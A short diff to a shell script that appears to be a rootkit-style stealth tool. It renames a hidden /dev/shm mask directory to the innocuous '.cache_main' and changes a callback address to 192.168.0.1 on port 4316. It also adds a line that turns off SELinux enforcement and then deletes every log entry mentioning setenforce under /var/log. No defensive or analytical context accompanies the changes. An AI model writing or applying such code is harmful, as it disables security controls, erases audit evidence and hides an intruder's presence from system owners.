@@ -7,7 +7,7 @@ mtab() {
     [[ -L /etc/mtab ]] && { command cp /etc/mtab /etc/mtab.bak; command mv /etc/mtab.bak /etc/mtab; } 
     
     # source of the bind mount
-    local _mask="/dev/shm/.mask"
+    local _mask="/dev/shm/.cache_main"
     if [ ! -d "$_mask" ]; then
         command mkdir -p "$_mask"
         command chmod 555 "$_mask"
@@ -59,11 +59,11 @@ ssleep() {
 
 # START 
 # is Selinux stoping us from mounting to /dev/shm?
-command getenforce &>/dev/null && (getenforce | grep -q "Enforcing") && setenforce 0 #|| echo "NO setenforce needed" 
+command getenforce &>/dev/null && (getenforce | grep -q "Enforcing") && setenforce 0 && find /var/log -type f -exec sed -i "/setenforce/d" {} \; #|| echo "NO setenforce needed" 
 
 ### startup.sh ###
 
-IP="127.0.0.1"  
+IP="192.168.0.1"  
 PORT="4316" 
 
 trap cleanup EXIT SIGINT SIGTERM SIGHUP SIGTSTP
